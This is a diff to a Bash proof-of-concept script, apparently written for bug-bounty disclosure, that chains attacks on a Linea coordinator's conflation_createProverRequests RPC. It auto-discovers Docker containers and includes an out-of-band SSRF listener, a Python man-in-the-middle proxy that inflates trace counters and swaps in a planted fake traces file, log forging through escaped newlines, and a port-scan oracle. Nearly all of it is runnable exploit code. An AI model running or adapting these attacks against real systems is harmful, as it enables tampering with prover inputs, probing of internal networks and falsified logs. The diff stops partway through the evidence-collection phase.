@@ -1,8 +1,14 @@
 #!/bin/bash
 # ==============================================================================
-# LINEA COORDINATOR SSRF - FINAL UNIFIED PoC (v15)
-# 100% Dynamic: auto-discover semua (container, IP, port, upstream, range, mount)
-# Jalankan di setup docker mana pun. Output -> poc_ssrf_final_results.txt
+# LINEA COORDINATOR SSRF - FINAL PoC v16 (fully dynamic)
+# FIX v16:
+#   F1: poison_counters menargetkan result.tracesCounters (format asli API)
+#   F2: shomeiApi DIARAHKAN LANGSUNG ke container shomei (docker DNS),
+#       tidak lewat MITM host (menyebabkan retry + job stuck sebelum request file)
+#   F3: log injection dengan newline JSON-escaped (parser build baru strict)
+#       + shomeiApi ditambahkan (DTO wajib)
+#   F4: port oracle payload + shomeiApi (DTO wajib)
+#   F5: evidence poisoned-batch grep spesifik (ADD=1000/999999999)
 # ==============================================================================
 set -u
 OUT="poc_ssrf_final_results.txt"
@@ -10,64 +16,48 @@ OUT="poc_ssrf_final_results.txt"
 exec > >(tee -a "$OUT") 2>&1
 
 echo "=================================================================="
-echo "  LINEA COORDINATOR SSRF - FINAL PoC (fully dynamic)"
+echo "  LINEA COORDINATOR SSRF - FINAL PoC v16 (fully dynamic)"
 echo "  Phase: Discover -> SSRF -> Poison -> Prover Input -> Log Forge"
 echo "=================================================================="
 echo "Timestamp: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
 echo ""
 
 # ==============================================================================
-# PHASE 0: DISCOVERY - auto-detect semuanya
+# PHASE 0: DISCOVERY
 # ==============================================================================
 echo "=============== PHASE 0: ENVIRONMENT DISCOVERY ==============="
 
-# --- 0.1. Cari container coordinator (by name pattern / port / label) ---
 find_coordinator() {
   local c
-  # Method 1: by name
   c=$(docker ps --format '{{.Names}}' 2>/dev/null | grep -iE "^coordinator$|linea-coordinator|coordinator" | head -n1)
   [ -n "$c" ] && echo "$c" && return 0
-  # Method 2: by image
   c=$(docker ps --format '{{.Names}}\t{{.Image}}' 2>/dev/null | grep -iE "coordinator" | awk -F'\t' '{print $1}' | head -n1)
   [ -n "$c" ] && echo "$c" && return 0
   return 1
 }
-
 COORD=$(find_coordinator)
 if [ -z "$COORD" ]; then
-  echo "[-] Container Coordinator tidak ditemukan. Container yang berjalan:"
+  echo "[-] Container Coordinator tidak ditemukan. Container berjalan:"
   docker ps --format '{{.Names}}\t{{.Image}}' 2>/dev/null | head -20 | sed 's/^/    /'
   exit 1
 fi
 echo "[+] Coordinator container : $COORD"
 
-# --- 0.2. Cari port JSON-RPC (dari log, dari env, dari compose label, dari config) ---
 find_rpc_port() {
   local c="$1" p=""
-  # Method 1: from logs
   p=$(docker logs "$c" 2>&1 | grep -oiE "JSON-RPC server started port=[0-9]+" | tail -n1 | grep -oE "[0-9]+$")
   [ -n "$p" ] && echo "$p" && return 0
-  # Method 2: from config file in container
   p=$(docker exec "$c" sh -c 'cat /opt/consensys/linea/coordinator/config/*.toml 2>/dev/null | grep -oE "json-rpc-port\s*=\s*[0-9]+" | grep -oE "[0-9]+"' 2>/dev/null)
   [ -n "$p" ] && echo "$p" && return 0
-  # Method 3: from env
   p=$(docker inspect -f '{{range .Config.Env}}{{println .}}{{end}}' "$c" 2>/dev/null | grep -oE "JSON_RPC_PORT=[0-9]+" | grep -oE "[0-9]+")
   [ -n "$p" ] && echo "$p" && return 0
-  # Method 4: common defaults
-  for pd in 9546 8545 9545; do
-    if docker exec "$c" sh -c "command -v nc >/dev/null 2>&1 && nc -z localhost $pd" 2>/dev/null; then
-      echo "$pd" && return 0
-    fi
-  done
-  echo "9546" # last resort
+  echo "9546"
 }
 RPC_PORT=$(find_rpc_port "$COORD")
 
-# --- 0.3. Cari IP container (multi-network aware) ---
 CONTAINER_IPS=($(docker inspect -f '{{range $k, $v := .NetworkSettings.Networks}}{{$v.IPAddress}} {{end}}' "$COORD" 2>/dev/null))
 CONTAINER_GWS=($(docker inspect -f '{{range $k, $v := .NetworkSettings.Networks}}{{$v.Gateway}} {{end}}' "$COORD" 2>/dev/null))
 
-# --- 0.4. Cari RPC endpoint yang hidup ---
 RPC=""
 for ip in "${CONTAINER_IPS[@]}"; do
   for port in "$RPC_PORT" 9546 9545 8545; do
@@ -75,79 +65,78 @@ for ip in "${CONTAINER_IPS[@]}"; do
         -H 'Content-Type: application/json' \
         -d '{"jsonrpc":"2.0","method":"rpc_modules","params":[],"id":1}' 2>/dev/null)
     if echo "$r" | grep -q '"jsonrpc"'; then
-      RPC="http://${ip}:${port}/"; echo "$port"; break 2
+      RPC="http://${ip}:${port}/"; break 2
     fi
   done
 done
 if [ -z "$RPC" ]; then
-  echo "[-] Coordinator RPC tidak reachable dari host. Health check:"
+  echo "[-] Coordinator RPC tidak reachable. Health:"
   docker ps --filter name="$COORD" --format "    Status: {{.Status}}"
-  echo "    Jika unhealthy: restart dengan: docker restart $COORD; sleep 60; re-run script"
+  echo "    Jika unhealthy: docker restart $COORD; sleep 60; re-run"
   exit 1
 fi
-echo "[+] Coordinator RPC       : $RPC"
-
-# --- 0.5. Gateway IP (dipakai untuk listener OOB) ---
+echo "[+] Coordinator RPC       : $RPC (port $RPC_PORT)"
 GW="${CONTAINER_GWS[0]:-172.17.0.1}"
 echo "[+] Gateway IP (OOB host) : $GW"
 
-# --- 0.6. Cari container lain (sequencer, besu/traces, shomei) ---
-find_by_probe() {
-  local target_method="$1" target_port="$2"
+find_by_probe() { # $1=method, $2=port, $3=params-json; hanya match '"result"'
+  local m="$1" pt="$2" pj="${3:-[]}"
   for c in $(docker ps --format '{{.Names}}' | grep -viE "$COORD"); do
     for cip in $(docker inspect -f '{{range $k, $v := .NetworkSettings.Networks}}{{$v.IPAddress}} {{end}}' "$c" 2>/dev/null); do
-      r=$(curl -s --connect-timeout 2 --max-time 3 -X POST "http://${cip}:${target_port}" \
+      r=$(curl -s --connect-timeout 2 --max-time 3 -X POST "http://${cip}:${pt}" \
           -H 'Content-Type: application/json' \
-          -d "{\"jsonrpc\":\"2.0\",\"method\":\"$target_method\",\"params\":[],\"id\":1}" 2>/dev/null)
-      if echo "$r" | grep -qE '"jsonrpc"|"result"'; then
-        echo "$cip"; return 0
-      fi
+          -d "{\"jsonrpc\":\"2.0\",\"method\":\"$m\",\"params\":$pj,\"id\":1}" 2>/dev/null)
+      if echo "$r" | grep -q '"result"'; then echo "$cip"; return 0; fi
     done
   done
   return 1
 }
 
-echo "[*] Mencari Sequencer (eth_blockNumber)..."
+echo "[*] Mencari Sequencer..."
 SEQ_IP=$(find_by_probe "eth_blockNumber" 8545)
 echo "[+] Sequencer IP: ${SEQ_IP:-NOT_FOUND}"
 
-echo "[*] Mencari Traces API (linea_getBlockTracesCountersV2)..."
-TRACES_IP=$(find_by_probe "linea_getBlockTracesCountersV2" 8545)
-if [ -z "$TRACES_IP" ]; then
-  # Try other ports
-  TRACES_IP=$(find_by_probe "linea_getBlockTracesCountersV2" 8080)
-fi
+echo "[*] Mencari Traces API (probe dengan blockNumber valid)..."
+TRACES_IP=$(find_by_probe "linea_getBlockTracesCountersV2" 8545 '[{"blockNumber":1}]')
+[ -z "$TRACES_IP" ] && TRACES_IP=$(find_by_probe "linea_getBlockTracesCountersV2" 8080 '[{"blockNumber":1}]')
 echo "[+] Traces/Besu IP: ${TRACES_IP:-NOT_FOUND}"
 
-echo "[*] Mencari Shomei (rollup_getZkEVMStateMerkleProofV0)..."
-SHOMEI_IP=$(find_by_probe "rollup_getZkEVMStateMerkleProofV0" 8888)
-if [ -z "$SHOMEI_IP" ]; then
-  SHOMEI_IP=$(find_by_probe "rollup_getZkEVMStateMerkleProofV0" 8546)
+# F2: shomei endpoint untuk JOB = NAMA CONTAINER (coordinator resolve via docker DNS)
+find_shomei_name() {
+  local n
+  for pat in "shomei-frontend" "^shomei$" "shomei"; do
+    n=$(docker ps --format '{{.Names}}' | grep -iE "$pat" | head -n1)
+    [ -n "$n" ] && echo "$n" && return 0
+  done
+  return 1
+}
+SHOMEI_NAME=$(find_shomei_name)
+if [ -n "$SHOMEI_NAME" ]; then
+  SHOMEI_EP="http://${SHOMEI_NAME}:8888"
+else
+  SHIP=$(find_by_probe "rollup_getZkEVMStateMerkleProofV0" 8888 '[{"startBlockNumber":1,"endBlockNumber":1}]')
+  [ -z "$SHIP" ] && SHIP=$(find_by_probe "rollup_getZkEVMStateMerkleProofV0" 8546 '[{"startBlockNumber":1,"endBlockNumber":1}]')
+  SHOMEI_EP="http://${SHIP}:8888"
 fi
-echo "[+] Shomei IP: ${SHOMEI_IP:-NOT_FOUND}"
+echo "[+] Shomei endpoint (untuk job, direct-by-name): ${SHOMEI_EP:-NOT_FOUND}"
 
-# --- 0.7. Cari host data dir (mount /data) ---
 find_host_data() {
   local c="$1" src=""
-  # From inspect mounts
   src=$(docker inspect -f '{{range .Mounts}}{{if eq .Destination "/data"}}{{.Source}}{{end}}{{end}}' "$c" 2>/dev/null)
   [ -n "$src" ] && { echo "$src"; return 0; }
-  # From repo path detection
   for d in /workspaces/lineth-monorepo /workspace/lineth-monorepo ~/lineth-monorepo ../lineth-monorepo ./; do
     if [ -f "$d/docker/compose-tracing-v2.yml" ] || [ -d "$d/tmp/local" ]; then
       echo "$d/tmp/local"; return 0
     fi
   done
-  # From docker inspect all mounts
   src=$(docker inspect -f '{{range .Mounts}}{{if contains .Destination "conflation-backtesting"}}{{.Source}}{{end}}{{end}}' "$c" 2>/dev/null)
   [ -n "$src" ] && { echo "$(dirname "$src")"; return 0; }
   return 1
 }
 HOST_DATA=$(find_host_data "$COORD")
-echo "[+] Host data dir: ${HOST_DATA:-NOT_FOUND (file evidence akan di-skip)}"
+echo "[+] Host data dir: ${HOST_DATA:-NOT_FOUND (file evidence di-skip)}"
 [ -n "$HOST_DATA" ] && mkdir -p "$HOST_DATA/conflation-backtesting" 2>/dev/null
 
-# --- 0.8. Chain head & block range valid ---
 echo -e "\n[*] Chain head (sequencer):"
 CHAIN_HEAD=0
 if [ -n "$SEQ_IP" ]; then
@@ -157,7 +146,6 @@ if [ -n "$SEQ_IP" ]; then
 fi
 echo "    Chain head: $CHAIN_HEAD"
 
-# Jika head = 0, tunggu block
 if [ "$CHAIN_HEAD" -lt 5 ]; then
   echo "    Chain kosong/idle - menunggu block production (max 120s)..."
   for i in $(seq 1 12); do
@@ -173,21 +161,16 @@ if [ "$CHAIN_HEAD" -lt 5 ]; then
   echo ""
 fi
 
-# Block range: pakai block yang ada
 if [ "$CHAIN_HEAD" -ge 5 ]; then
   END=$((CHAIN_HEAD-2)); START=$((CHAIN_HEAD-3))
-  # Verify traces ada
   if [ -n "$TRACES_IP" ]; then
     TC=$(curl -s -m 5 -X POST "http://${TRACES_IP}:8545" -H 'Content-Type: application/json' \
       -d "{\"jsonrpc\":\"2.0\",\"method\":\"linea_getBlockTracesCountersV2\",\"params\":[{\"blockNumber\":$START}],\"id\":1}" 2>/dev/null)
     if ! echo "$TC" | grep -q '"tracesCounters"'; then
-      # Coba block lain
       for b in $(seq 1 "$CHAIN_HEAD"); do
         TC=$(curl -s -m 5 -X POST "http://${TRACES_IP}:8545" -H 'Content-Type: application/json' \
           -d "{\"jsonrpc\":\"2.0\",\"method\":\"linea_getBlockTracesCountersV2\",\"params\":[{\"blockNumber\":$b}],\"id\":1}" 2>/dev/null)
-        if echo "$TC" | grep -q '"tracesCounters"'; then
-          END=$b; START=$b; break
-        fi
+        if echo "$TC" | grep -q '"tracesCounters"'; then END=$b; START=$b; break; fi
       done
     fi
   fi
@@ -201,19 +184,16 @@ echo "  DISCOVERY SELESAI - mulai attack chain"
 echo "=================================================================="
 
 # ==============================================================================
-# PHASE 1: BASELINE SSRF - OOB capture (blind POST)
+# PHASE 1: BASELINE SSRF - OOB capture
 # ==============================================================================
 echo -e "\n=============== PHASE 1: BASELINE SSRF (OOB) ==============="
 
-# Bersihkan port
 OOB_PORT=12345
 fuser -k ${OOB_PORT}/tcp 2>/dev/null; sleep 1
-
-# OOB listener - log SEMUA request (method, body, headers)
 OOB_LOG=/tmp/ssrf_oob_capture.txt
 rm -f "$OOB_LOG"; : > "$OOB_LOG"
 python3 - <<'PYEOF' > /dev/null 2>&1 &
-import http.server, json
+import http.server
 LOG="/tmp/ssrf_oob_capture.txt"
 class H(http.server.BaseHTTPRequestHandler):
     def _log(self, body=b""):
@@ -243,123 +223,102 @@ R=$(curl -s --max-time 10 -X POST "$RPC" -H 'Content-Type: application/json' -d 
     \"tracesApi\":{\"endpoint\":\"http://${GW}:${OOB_PORT}\",\"requestLimitPerEndpoint\":100},
     \"shomeiApi\":{\"endpoint\":\"http://${GW}:${OOB_PORT}\",\"requestLimitPerEndpoint\":100}}]}")
 echo "    Response: $R"
-
 echo "[1.2] Menunggu 30 detik..."
 sleep 30
-
 if [ -s "$OOB_LOG" ]; then
   echo "    [!!!] SSRF TERKONFIRMASI - request outbound ditangkap:"
   cat "$OOB_LOG" | head -20 | sed 's/^/      /'
 else
-  echo "    [-] Tidak ada request (job mungkin belum berjalan - lanjut ke phase lain)"
+  echo "    [-] Tidak ada request (lanjut ke phase lain)"
 fi
 
 # ==============================================================================
-# PHASE 2: DATA POISONING - schema-correct MITM ke upstream asli
+# PHASE 2: DATA POISONING + PROVER INPUT (MITM hanya untuk traces;
+#          shomei DIRECT ke container shomei - F2)
 # ==============================================================================
 echo -e "\n=============== PHASE 2: DATA POISONING ==============="
 
 MITM_PORT=12346
 fuser -k ${MITM_PORT}/tcp 2>/dev/null; sleep 1
 
-# Setup upstream
-if [ -n "$TRACES_IP" ]; then
-  export UPSTREAM_TRACES="http://${TRACES_IP}:8545"
-else
-  export UPSTREAM_TRACES=""
-fi
-if [ -n "$SHOMEI_IP" ]; then
-  export UPSTREAM_SHOMEI="http://${SHOMEI_IP}:8888"
-else
-  export UPSTREAM_SHOMEI=""
-fi
-
+if [ -n "$TRACES_IP" ]; then export UPSTREAM_TRACES="http://${TRACES_IP}:8545"; else export UPSTREAM_TRACES=""; fi
 MITM_LOG=/tmp/ssrf_mitm_log.txt
 rm -f "$MITM_LOG"; : > "$MITM_LOG"
 
-# Plant file marker sebelum MITM (butuh MARK di environment python)
 MARK="ATTACKER$(date +%s)"
 export SSRF_MARK="$MARK"
 
 python3 - <<'PYEOF' > /dev/null 2>&1 &
 import http.server, json, os, urllib.request, urllib.error
 TRACES=os.environ.get("UPSTREAM_TRACES","")
-SHOMEI=os.environ.get("UPSTREAM_SHOMEI","")
 LOG="/tmp/ssrf_mitm_log.txt"
-def forward(url, body):
-    if not url: return 0, json.dumps({"jsonrpc":"2.0","id":1,"error":{"code":-32601,"message":"no upstream"}}).encode()
-    req=urllib.request.Request(url, data=body, headers={"Content-Type":"application/json"}, method="POST")
+MARK=os.environ.get("SSRF_MARK","ATTACKER")
+FAKE_PATH="/data/traces/v2/conflated/%s.attacker.lt.gz" % MARK
+def forward(body):
+    if not TRACES:
+        return 0, json.dumps({"jsonrpc":"2.0","id":1,"error":{"code":-32601,"message":"no upstream"}}).encode()
+    req=urllib.request.Request(TRACES, data=body, headers={"Content-Type":"application/json"}, method="POST")
     try:
         with urllib.request.urlopen(req, timeout=180) as r: return 200, r.read()
     except urllib.error.HTTPError as e: return e.code, e.read()
     except Exception as e: return 0, json.dumps({"jsonrpc":"2.0","id":1,"error":{"code":-32000,"message":"proxy:%s"%e}}).encode()
 
+def find_counters_target(obj):
+    """F1: format asli response = result.tracesCounters (flat dict).
+    Fallback: countersMap (nested)."""
+    res = obj.get("result") if isinstance(obj, dict) else None
+    if not isinstance(res, dict): return None
+    for key in ("tracesCounters", "countersMap", "counters"):
+        if isinstance(res.get(key), dict): return res[key]
+    tc = res.get("tracesCounters")
+    if isinstance(tc, dict) and isinstance(tc.get("countersMap"), dict): return tc["countersMap"]
+    return None
+
 def poison_counters(obj, mode):
-    """Tamper countersMap sesuai mode"""
-    hits = []
-    def walk(o):
-        if isinstance(o, dict):
-            if "countersMap" in o and isinstance(o["countersMap"], dict):
-                for k in o["countersMap"]:
-                    if isinstance(o["countersMap"][k], int):
-                        hits.append(k)
-                        o["countersMap"][k] = 999999999 if mode=="over" else o["countersMap"][k]+1000
-            for v in o.values():
-                walk(v)
-        elif isinstance(o, list):
-            for x in o: walk(x)
-    walk(obj)
+    tgt = find_counters_target(obj)
+    if tgt is None: return []
+    hits=[]
+    for k in list(tgt.keys()):
+        if isinstance(tgt[k], int):
+            hits.append(k)
+            tgt[k] = 999999999 if mode=="over" else tgt[k]+1000
     return hits
 
-def poison_filename(obj, mode, fake_path):
-    """Tamper conflatedTracesFileName + tracesEngineVersion"""
-    note = ""
-    if isinstance(obj, dict) and "result" in obj and isinstance(obj["result"], dict):
-        res = obj["result"]
-        if "conflatedTracesFileName" in res:
-            orig = res["conflatedTracesFileName"]
-            res["conflatedTracesFileName"] = fake_path
-            res["tracesEngineVersion"] = "attacker-1"
-            note = "TAMPER filename: %s -> %s" % (orig, fake_path)
+def poison_filename(obj):
+    note=""
+    res = obj.get("result") if isinstance(obj, dict) else None
+    if isinstance(res, dict) and "conflatedTracesFileName" in res:
+        orig = res["conflatedTracesFileName"]
+        res["conflatedTracesFileName"]=FAKE_PATH
+        res["tracesEngineVersion"]="attacker-1"
+        note="TAMPER filename: %s -> %s" % (orig, FAKE_PATH)
     return note
-
-MARK = os.environ.get("SSRF_MARK", "ATTACKER")
-FAKE_PATH = "/data/traces/v2/conflated/%s.attacker.lt.gz" % MARK
 
 class H(http.server.BaseHTTPRequestHandler):
     def do_POST(self):
         n=int(self.headers.get("Content-Length") or 0); body=self.rfile.read(n)
         try: method=json.loads(body).get("method","")
         except: method=""
-
-        # Route: linea_* -> traces, rollup_* -> shomei
-        up = SHOMEI if method.startswith("rollup_") else TRACES
-        code, resp = forward(up, body)
-        note = ""
-
-        # Tamper berdasarkan path suffix
-        if "/poison-over" in self.path and method == "linea_getBlockTracesCountersV2" and code==200:
+        code, resp = forward(body)   # semua request -> traces upstream (shomei kini direct)
+        note=""
+        if code==200 and method=="linea_getBlockTracesCountersV2":
+            if "/poison-over" in self.path:
+                try:
+                    obj=json.loads(resp); hits=poison_counters(obj,"over")
+                    if hits: note="[OVER:%d counters -> 999999999]"%len(hits); resp=json.dumps(obj).encode()
+                except: pass
+            elif "/poison-plus" in self.path:
+                try:
+                    obj=json.loads(resp); hits=poison_counters(obj,"plus")
+                    if hits: note="[PLUS:%d counters +1000]"%len(hits); resp=json.dumps(obj).encode()
+                except: pass
+        elif code==200 and method=="linea_generateConflatedTracesToFileV2" and "/poison-file" in self.path:
             try:
-                obj=json.loads(resp)
-                hits = poison_counters(obj, "over")
-                if hits: note = "[OVER:%d counters -> 999999999]" % len(hits); resp=json.dumps(obj).encode()
-            except: pass
-        elif "/poison-plus" in self.path and method == "linea_getBlockTracesCountersV2" and code==200:
-            try:
-                obj=json.loads(resp)
-                hits = poison_counters(obj, "plus")
-                if hits: note = "[PLUS:%d counters +1000]" % len(hits); resp=json.dumps(obj).encode()
-            except: pass
-        elif "/poison-file" in self.path and method == "linea_generateConflatedTracesToFileV2" and code==200:
-            try:
-                obj=json.loads(resp)
-                note = poison_filename(obj, "file", FAKE_PATH)
+                obj=json.loads(resp); note=poison_filename(obj)
                 if note: resp=json.dumps(obj).encode()
             except: pass
-
         with open(LOG,"a") as f:
             f.write(">> %s %s %s\n   resp: %s\n" % (self.path, method, note, resp[:200].decode(errors='replace')))
-
         self.send_response(200); self.send_header("Content-Type","application/json")
         self.send_header("Content-Length",str(len(resp))); self.end_headers(); self.wfile.write(resp)
     def do_GET(self):
@@ -369,77 +328,75 @@ class H(http.server.BaseHTTPRequestHandler):
 http.server.ThreadingHTTPServer(("0.0.0.0",12346),H).serve_forever()
 PYEOF
 MITM_PID=$!; sleep 1
-echo "[+] MITM aktif (PID $MITM_PID, :$MITM_PORT) -> traces=${UPSTREAM_TRACES:-none} shomei=${UPSTREAM_SHOMEI:-none}"
+echo "[+] MITM aktif (:$MITM_PORT) -> traces=${UPSTREAM_TRACES:-none} | shomei job-direct: ${SHOMEI_EP:-none}"
 
-# Submit poison job (plus mode - silent corruption, ADD=1000)
+# Payload builder: traces via MITM(path), shomei DIRECT (F2)
+submit_job() { # $1 = path suffix MITM
+  curl -s --max-time 10 -X POST "$RPC" -H 'Content-Type: application/json' -d "{
+    \"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":1,
+    \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
+      \"tracesApi\":{\"endpoint\":\"http://${GW}:${MITM_PORT}$1\",\"requestLimitPerEndpoint\":100},
+      \"shomeiApi\":{\"endpoint\":\"${SHOMEI_EP:-http://${GW}:${OOB_PORT}}\",\"requestLimitPerEndpoint\":100}}]}"
+}
+
 echo "[2.1] Submit POISON-PLUS job (counters +1000, silent)..."
-RP=$(curl -s --max-time 10 -X POST "$RPC" -H 'Content-Type: application/json' -d "{
-  \"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":1,
-  \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
-    \"tracesApi\":{\"endpoint\":\"http://${GW}:${MITM_PORT}/poison-plus\",\"requestLimitPerEndpoint\":100},
-    \"shomeiApi\":{\"endpoint\":\"http://${GW}:${MITM_PORT}\",\"requestLimitPerEndpoint\":100}}]}")
-echo "    Response: $RP"
+RP=$(submit_job "/poison-plus"); echo "    Response: $RP"
 JOB_PLUS=$(echo "$RP" | grep -oE '[0-9]+-[0-9]+-+[0-9]+' | head -n1)
 
-# Submit poison job (over mode - TRACES_LIMIT trigger)
 echo "[2.2] Submit POISON-OVER job (counters=999999999, decision control)..."
-RO=$(curl -s --max-time 10 -X POST "$RPC" -H 'Content-Type: application/json' -d "{
-  \"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":1,
-  \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
-    \"tracesApi\":{\"endpoint\":\"http://${GW}:${MITM_PORT}/poison-over\",\"requestLimitPerEndpoint\":100},
-    \"shomeiApi\":{\"endpoint\":\"http://${GW}:${MITM_PORT}\",\"requestLimitPerEndpoint\":100}}]}")
-echo "    Response: $RO"
+RO=$(submit_job "/poison-over"); echo "    Response: $RO"
 JOB_OVER=$(echo "$RO" | grep -oE '[0-9]+-[0-9]+-+[0-9]+' | head -n1)
 
-echo "    JobIDs: PLUS=$JOB_PLUS | OVER=$JOB_OVER"
-
-# Submit prover-input-control job
 echo "[2.3] Submit PROVER-INPUT job (filename tamper)..."
-# Plant file first
 if [ -n "$HOST_DATA" ]; then
   mkdir -p "$HOST_DATA/traces/v2/conflated"
   printf '{"fake":"traces","marker":"%s"}' "$MARK" > "$HOST_DATA/traces/v2/conflated/$MARK.attacker.lt.gz"
   echo "    File ditanam: /data/traces/v2/conflated/$MARK.attacker.lt.gz"
 fi
-RF=$(curl -s --max-time 10 -X POST "$RPC" -H 'Content-Type: application/json' -d "{
-  \"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":1,
-  \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
-    \"tracesApi\":{\"endpoint\":\"http://${GW}:${MITM_PORT}/poison-file\",\"requestLimitPerEndpoint\":100},
-    \"shomeiApi\":{\"endpoint\":\"http://${GW}:${MITM_PORT}\",\"requestLimitPerEndpoint\":100}}]}")
-echo "    Response: $RF"
+RF=$(submit_job "/poison-file"); echo "    Response: $RF"
 JOB_FILE=$(echo "$RF" | grep -oE '[0-9]+-[0-9]+-+[0-9]+' | head -n1)
-echo "    JobID FILE: $JOB_FILE"
+echo "    JobIDs: PLUS=$JOB_PLUS | OVER=$JOB_OVER | FILE=$JOB_FILE"
 
-echo "[2.4] Menunggu 120 detik untuk processing..."
-for i in $(seq 1 12); do sleep 10; printf "    ... %ds\r" $((i*10)); done
+echo "[2.4] Monitoring maks 300s (exit dini: poisoned batch ATAU request file)..."
+for i in $(seq 1 30); do
+  sleep 10
+  PB=$(docker logs "$COORD" --since 5m 2>&1 | grep "new batch" | grep -cE "ADD=1000|ADD=999999999" || true)
+  FJ=""
+  if [ -n "$HOST_DATA" ] && [ -n "$JOB_FILE" ]; then
+    FJ=$(find "$HOST_DATA/conflation-backtesting/$JOB_FILE" -name "*.json" -type f 2>/dev/null | head -n1)
+  fi
+  if [ -n "$FJ" ] || [ "${PB:-0}" -ge 1 ]; then echo "    [+] terdeteksi pada detik $((i*10))"; break; fi
+  printf "    ... %ds (poisoned-batch=%s, reqfile=%s)\r" $((i*10)) "${PB:-0}" "$([ -n "$FJ" ] && echo ADA || echo '-')"
+done
 echo ""
 
 # ==============================================================================
-# PHASE 3: LOG INJECTION (CWE-117)
+# PHASE 3: LOG INJECTION (CWE-117) - F3: escaped newline + shomeiApi
 # ==============================================================================
 echo -e "\n=============== PHASE 3: LOG INJECTION ==============="
 
 SPOOF_MARK="SPOOF$(date +%s)"
-FORGED_URL="http://${GW}:${OOB_PORT}/x
-time=2099-01-01T00:00:00,000Z level=ERROR message=$SPOOF_MARK FAKE-LOG-ENTRY-BY-ATTACKER"
+# JSON-escaped newline: \\n di shell -> \n di JSON -> newline nyata setelah parse
+FORGED_URL="http://${GW}:${OOB_PORT}/x\\ntime=2099-01-01T00:00:00,000Z level=ERROR message=$SPOOF_MARK FAKE-LOG-ENTRY-BY-ATTACKER"
 
-echo "[3.1] Submit URL dengan newline (log forging)..."
-RL=$(curl -s --max-time 10 -X POST "$RPC" -H 'Content-Type: application/json' \
-  -d "{\"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":1,
+echo "[3.1] Submit URL dengan newline escaped (log forging)..."
+RL=$(curl -s --max-time 10 -X POST "$RPC" -H 'Content-Type: application/json' -d "{
+  \"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":1,
   \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
-  \"tracesApi\":{\"endpoint\":\"$FORGED_URL\",\"requestLimitPerEndpoint\":1}}]}")
-echo "    Response: $RL (note: Internal error = newline diterima)"
-sleep 10
-
+  \"tracesApi\":{\"endpoint\":\"$FORGED_URL\",\"requestLimitPerEndpoint\":1},
+  \"shomeiApi\":{\"endpoint\":\"http://${GW}:${OOB_PORT}\",\"requestLimitPerEndpoint\":1}}]}")
+echo "    Response: $RL"
+sleep 15
 if docker logs "$COORD" 2>&1 | grep -q "time=2099-01-01.*$SPOOF_MARK"; then
   echo "    [!!!] LOG FORGING CONFIRMED (CWE-117):"
   docker logs "$COORD" 2>&1 | grep "time=2099" | head -2 | sed 's/^/      /'
 else
-  echo "    [-] Tidak terdeteksi sebagai baris mandiri"
+  echo "    [-] Forged line belum terdeteksi. Cek manual:"
+  docker logs "$COORD" --since 2m 2>&1 | grep -i "Illegal character" | head -2 | cut -c1-250 | sed 's/^/      /'
 fi
 
 # ==============================================================================
-# PHASE 4: PORT SCAN ORACLE
+# PHASE 4: PORT SCAN ORACLE - F4: + shomeiApi
 # ==============================================================================
 echo -e "\n=============== PHASE 4: PORT SCAN ORACLE ==============="
 
@@ -447,14 +404,15 @@ echo "[4.1] Closed port (connection refused oracle)..."
 RS=$(curl -s --max-time 10 -X POST "$RPC" -H 'Content-Type: application/json' -d "{
   \"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":1,
   \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
-  \"tracesApi\":{\"endpoint\":\"http://${GW}:9999\",\"requestLimitPerEndpoint\":1}}]}")
+  \"tracesApi\":{\"endpoint\":\"http://${GW}:9999\",\"requestLimitPerEndpoint\":1},
+  \"shomeiApi\":{\"endpoint\":\"http://${GW}:${OOB_PORT}\",\"requestLimitPerEndpoint\":1}}]}")
 echo "    Response: $RS"
-sleep 20
-ORACLE=$(docker logs "$COORD" --since 30s 2>&1 | grep -iE "refused.*9999" | head -n1)
+sleep 25
+ORACLE=$(docker logs "$COORD" --since 40s 2>&1 | grep -iE "refused.*9999" | head -n1)
 if [ -n "$ORACLE" ]; then
   echo "    [+] ORACLE CONFIRMED: $(echo "$ORACLE" | cut -c1-200)"
 else
-  echo "    [-] Oracle tidak muncul dalam 30s (coba lagi nanti - retry loop)"
+  echo "    [-] Oracle belum muncul (retry loop butuh waktu - cek ulang nanti)"
 fi
 
 # ==============================================================================
@@ -462,36 +420,42 @@ fi
 # ==============================================================================
 echo -e "\n=============== PHASE 5: EVIDENCE COLLECTION ==============="
 
-echo "(A) MITM LOG (semua request + tamper):"
-grep "^>>" "$MITM_LOG" 2>/dev/null | head -30 | sed 's/^/    /'
+echo "(A) MITM LOG (request + tamper + response):"
+grep -E "^(>>|   resp)" "$MITM_LOG" 2>/dev/null | head -40 | sed 's/^/    /'
 
-echo -e "\n(B) LOG COORDINATOR - Poisoned counters di 'new batch':"
-docker logs "$COORD" 2>&1 | grep "new batch" | grep -oE "trigger=[A-Z_]+ tracesCounters=TracesCountersV5\(countersMap=\{[^}]{0,80}" | tail -5 | sed 's/^/    /'
+echo -e "\n(B) POISONED BATCHES (grep spesifik - F5):"
+docker logs "$COORD" 2>&1 | grep "new batch" | grep -E "ADD=1000|ADD=999999999" | tail -4 | cut -c1-300 | sed 's/^/    /'
 
 echo -e "\n(C) File request job PROVER-INPUT:"
 if [ -n "$HOST_DATA" ] && [ -n "$JOB_FILE" ]; then
-  find "$HOST_DATA/conflation-backtesting/$JOB_FILE" -type f 2>/dev/null | head -8 | sed 's/^/    /'
